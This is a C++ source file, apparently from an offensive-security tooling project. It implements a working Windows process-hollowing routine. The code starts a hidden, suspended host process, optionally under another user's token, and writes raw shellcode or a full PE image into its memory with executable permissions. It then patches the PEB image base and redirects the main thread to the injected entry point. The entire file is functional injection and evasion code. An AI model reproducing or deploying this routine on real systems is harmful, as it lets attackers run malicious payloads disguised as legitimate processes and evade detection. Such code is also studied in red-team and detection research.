//
// MIT License
//
// Copyright (c) 2019 Rokas Kupstys
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the "Software"),
// to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense,
// and/or sell copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
// THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
// DEALINGS IN THE SOFTWARE.
//
#include <ntdll.h>
#include "process_hollowing.h"
#include "debug.h"

#define GET_FIELD_SAFE(s, field, def) ((s) ? ((s)->field) : (def))

PROCESS_INFORMATION hollow_process(void* image, const char* host, hollow_process_startup_info* info)
{
    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};

    char* process_params = nullptr;
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput =  GetStdHandle(STD_OUTPUT_HANDLE);
    si.hStdError = GetStdHandle(STD_ERROR_HANDLE);

    auto params_size = strlen(host) + 1 /* space between app and args */;
    if (auto* args = GET_FIELD_SAFE(info, args, nullptr))
        params_size += strlen(args);
    params_size += 1 /* terminating null */;

    process_params = new char[params_size]{};
    strcat(process_params, host);

    if (info && info->args)
    {
        strcat(process_params, " ");
        strcat(process_params, info->args);
    }

    BOOL process_created = FALSE;
    if (HANDLE user_token = GET_FIELD_SAFE(info, user_token, 0))
    {
        si.lpDesktop = const_cast<char*>("winsta0\\default");
        process_created = CreateProcessAsUser(user_token, nullptr, process_params, nullptr, nullptr,
            GET_FIELD_SAFE(info, inherit_handles, false), CREATE_SUSPENDED | CREATE_NO_WINDOW,
            (LPVOID) GET_FIELD_SAFE(info, env, 0), GET_FIELD_SAFE(info, dir, 0), &si, &pi);
    }
    else
    {
        process_created = CreateProcessA(nullptr, process_params, nullptr, nullptr,
            GET_FIELD_SAFE(info, inherit_handles, false), CREATE_SUSPENDED | CREATE_NO_WINDOW,
            (LPVOID) GET_FIELD_SAFE(info, env, 0), GET_FIELD_SAFE(info, dir, 0), &si, &pi);
    }
    delete[] process_params;
    process_params = nullptr;

    auto failure = [&pi]() {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return PROCESS_INFORMATION{};
    };

    if (!process_created)
    {
        LOG_ERROR("Could not create fork process [%d]", NtLastError());
        return pi;
    }

    HANDLE hProcess = pi.hProcess;
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

    if (FAILED(NtGetContextThread(pi.hThread, &ctx)))
    {
        LOG_ERROR("Could not get thread context");
        return failure();
    }
#ifdef _M_X64
    auto* peb = (PPEB)ctx.Rdx;
#else
    auto* peb = (PPEB)ctx.Ebx;
#endif

    PVOID pBase = nullptr;
    if (FAILED(NtReadVirtualMemory(hProcess, &peb->ImageBaseAddress, &pBase, sizeof(SIZE_T), nullptr)))
    {
        LOG_ERROR("Could not read remote image base");
        return pi;
    }
    //ZwUnmapViewOfSection( hNewProc, pBase );	// with this some processes stop working

    PVOID base = nullptr;
    SIZE_T entryPoint = 0;
    if (unsigned shellcode_len = GET_FIELD_SAFE(info, shellcode_len, 0))
    {
        // Inject shellcode
        base = VirtualAllocEx(hProcess, nullptr, shellcode_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        entryPoint = reinterpret_cast<SIZE_T>(base);

        if (!base)
        {
            LOG_ERROR("Could not allocate memory for shellcode [%d]", GetLastError());
            return failure();
        }

        if (FAILED(NtWriteVirtualMemory(hProcess, base, image, shellcode_len, nullptr)))
        {
            LOG_ERROR("Failed to write shellcode [%d]", GetLastError());
            return failure();
        }
    }
    else
    {
        // Inject a PE image
        auto dh = reinterpret_cast<PIMAGE_DOS_HEADER>(image);
        auto nh = PIMAGE_NT_HEADERS(dh->e_lfanew + PBYTE(image));

        if (dh->e_magic != IMAGE_DOS_SIGNATURE || nh->Signature != IMAGE_NT_SIGNATURE)
        {
            LOG_ERROR("Image is not a valid PE");
            return failure();
        }

        base = VirtualAllocEx(hProcess, nullptr,
            nh->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        entryPoint = SIZE_T(base) + nh->OptionalHeader.AddressOfEntryPoint;

        if (!base)
        {
            LOG_ERROR("Could not allocate memory for image");
            return failure();
        }

        // Copy header
        if (FAILED(NtWriteVirtualMemory(hProcess, base, image, nh->OptionalHeader.SizeOfHeaders, nullptr)))
        {
            LOG_ERROR("Failed to write image");
            return failure();
        }

        // Protect header
        if (FAILED(VirtualProtectEx(hProcess, base, nh->OptionalHeader.SizeOfHeaders, PAGE_READONLY, nullptr)))
        {
            LOG_ERROR("Failed to protect PE header %d", GetLastError());
            return failure();
        }

        // Copy sections
        PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nh);
        for (unsigned long i = 0; i < nh->FileHeader.NumberOfSections; i++)
        {
            PCHAR section_address = PCHAR(base) + sect[i].VirtualAddress;
            if (FAILED(NtWriteVirtualMemory(hProcess, section_address,
                PCHAR(image) + sect[i].PointerToRawData, sect[i].SizeOfRawData, nullptr)))
            {
                LOG_ERROR("Failed to write section data");
                return failure();
            }
        }

        // Protect sections
        sect = IMAGE_FIRST_SECTION(nh);
        for (unsigned long i = 0; i < nh->FileHeader.NumberOfSections; i++)
        {
            PCHAR section_address = PCHAR(base) + sect[i].VirtualAddress;
            //                         e  r  w
            DWORD scn_to_memprot_flags[2][2][2] = {
                {{PAGE_NOACCESS, PAGE_WRITECOPY}, {PAGE_READONLY, PAGE_READWRITE}},
                {{PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY}, {PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE}}
            };
            DWORD section_flags = scn_to_memprot_flags
                [(sect[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) ? 1 : 0]
                [(sect[i].Characteristics & IMAGE_SCN_MEM_READ) ? 1 : 0]
                [(sect[i].Characteristics & IMAGE_SCN_MEM_WRITE) ? 1 : 0];

            if (sect[i].Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
                section_flags |= PAGE_NOCACHE;

            if (FAILED(VirtualProtectEx(hProcess, section_address, sect[i].SizeOfRawData, section_flags, nullptr)))
            {
                LOG_ERROR("Failed to change section memory protection [%d]", GetLastError());
                return failure();
            }
        }

        // Update PEB with new image base
        if (FAILED(NtWriteVirtualMemory(hProcess, &peb->ImageBaseAddress, &base, sizeof(SIZE_T), nullptr)))
        {
            LOG_ERROR("Failed to write new peb address");
            return failure();
        }
    }

#ifdef _M_X64
    ctx.Rcx = ctx.Rip = entryPoint;
    ctx.SegGs = 0;
    ctx.SegFs = 0x53;
    ctx.SegEs = 0x2B;
    ctx.SegDs = 0x2B;
    ctx.SegSs = 0x2B;
    ctx.SegCs = 0x33;
    ctx.EFlags = 0x3000;
#else
    ctx.Eax = ctx.Eip = entryPoint;
	ctx.SegGs = 0;
	ctx.SegFs = 0x38;
	ctx.SegEs = 0x20;
	ctx.SegDs = 0x20;
	ctx.SegSs = 0x20;
	ctx.SegCs = 0x18;
	ctx.EFlags = 0x3000;
#endif

    if (FAILED(NtSetContextThread(pi.hThread, &ctx)))
    {
        LOG_ERROR("Could not set new thread context");
        return failure();
    }

    return pi;
}
